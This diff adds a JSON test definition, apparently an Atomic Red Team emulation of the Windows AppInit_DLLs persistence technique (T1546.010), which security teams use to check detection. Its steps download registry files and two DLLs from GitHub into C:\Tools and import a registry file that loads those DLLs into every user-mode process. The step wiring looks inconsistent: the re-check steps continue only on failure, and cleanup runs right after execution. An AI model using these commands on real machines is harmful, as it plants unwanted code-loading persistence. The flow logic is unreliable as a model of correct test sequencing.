@@ -1,0 +1,164 @@
+{
+  "id": "a58d9386-3080-4242-ab5f-454c16503d18",
+  "name": "Install AppInit Shim",
+  "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "d1574b86-ee52-418b-bee7-98bd6eb6fab4",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe import \"#{registry_file}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e286032f-1fc4-45df-bc4b-4380be61bbb8",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe import \"#{registry_cleanup_file}\" \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0cc9eb17-a4a8-4554-a911-0f093da55490",
+      "name": "Check dependency 1/2",
+      "description": "Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"#{registry_file}\") -and (Test-Path \"#{registry_cleanup_file}\")) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c9d7b658-503b-48b3-ad37-afdc53372e53",
+      "name": "Resolve dependency 1/2",
+      "description": "Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{registry_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg\" -OutFile \"#{registry_file}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg\" -OutFile \"#{registry_cleanup_file}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d3d9790a-853a-409e-b6e4-82b8028e5756",
+      "name": "Re-check dependency 1/2",
+      "description": "Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"#{registry_file}\") -and (Test-Path \"#{registry_cleanup_file}\")) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fe4cf29a-f9e6-41ec-9ca7-8ad63158c85e",
+      "name": "Check dependency 2/2",
+      "description": "DLL's must exist in the C:\\Tools directory (T1546.010.dll and T1546.010x86.dll)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path c:\\Tools\\T1546.010.dll) -and (Test-Path c:\\Tools\\T1546.010x86.dll)) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c2048bc4-7e42-4627-9fd4-e7b2d24f6f6a",
+      "name": "Resolve dependency 2/2",
+      "description": "DLL's must exist in the C:\\Tools directory (T1546.010.dll and T1546.010x86.dll)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory C:\\Tools -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll\" -OutFile C:\\Tools\\T1546.010.dll\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll\" -OutFile C:\\Tools\\T1546.010x86.dll\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d2c8dd3d-2185-454a-97cd-7977c32b250c",
+      "name": "Re-check dependency 2/2",
+      "description": "DLL's must exist in the C:\\Tools directory (T1546.010.dll and T1546.010x86.dll)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path c:\\Tools\\T1546.010.dll) -and (Test-Path c:\\Tools\\T1546.010x86.dll)) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "d1574b86-ee52-418b-bee7-98bd6eb6fab4",
+      "p": "on-success",
+      "o": "e286032f-1fc4-45df-bc4b-4380be61bbb8"
+    },
+    {
+      "s": "d1574b86-ee52-418b-bee7-98bd6eb6fab4",
+      "p": "on-failure",
+      "o": "e286032f-1fc4-45df-bc4b-4380be61bbb8"
+    },
+    {
+      "s": "0cc9eb17-a4a8-4554-a911-0f093da55490",
+      "p": "on-success",
+      "o": "d1574b86-ee52-418b-bee7-98bd6eb6fab4"
+    },
+    {
+      "s": "0cc9eb17-a4a8-4554-a911-0f093da55490",
+      "p": "on-failure",
+      "o": "c9d7b658-503b-48b3-ad37-afdc53372e53"
+    },
+    {
+      "s": "c9d7b658-503b-48b3-ad37-afdc53372e53",
+      "p": "on-success",
+      "o": "d3d9790a-853a-409e-b6e4-82b8028e5756"
+    },
+    {
+      "s": "d3d9790a-853a-409e-b6e4-82b8028e5756",
+      "p": "on-failure",
+      "o": "d1574b86-ee52-418b-bee7-98bd6eb6fab4"
+    },
+    {
+      "s": "fe4cf29a-f9e6-41ec-9ca7-8ad63158c85e",
+      "p": "on-success",
+      "o": "d1574b86-ee52-418b-bee7-98bd6eb6fab4"
+    },
+    {
+      "s": "fe4cf29a-f9e6-41ec-9ca7-8ad63158c85e",
+      "p": "on-failure",
+      "o": "c2048bc4-7e42-4627-9fd4-e7b2d24f6f6a"
+    },
+    {
+      "s": "c2048bc4-7e42-4627-9fd4-e7b2d24f6f6a",
+      "p": "on-success",
+      "o": "d2c8dd3d-2185-454a-97cd-7977c32b250c"
+    },
+    {
+      "s": "d2c8dd3d-2185-454a-97cd-7977c32b250c",
+      "p": "on-failure",
+      "o": "d1574b86-ee52-418b-bee7-98bd6eb6fab4"
+    }
+  ],
+  "tags": [
+    "T1546.010",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "registry_file",
+      "type": "path",
+      "description": "Windows Registry File",
+      "value": "PathToAtomicsFolder\\T1546.010\\src\\T1546.010.reg"
+    },
+    {
+      "name": "registry_cleanup_file",
+      "type": "path",
+      "description": "Windows Registry File",
+      "value": "PathToAtomicsFolder\\T1546.010\\src\\T1546.010-cleanup.reg"
+    }
+  ]
+}
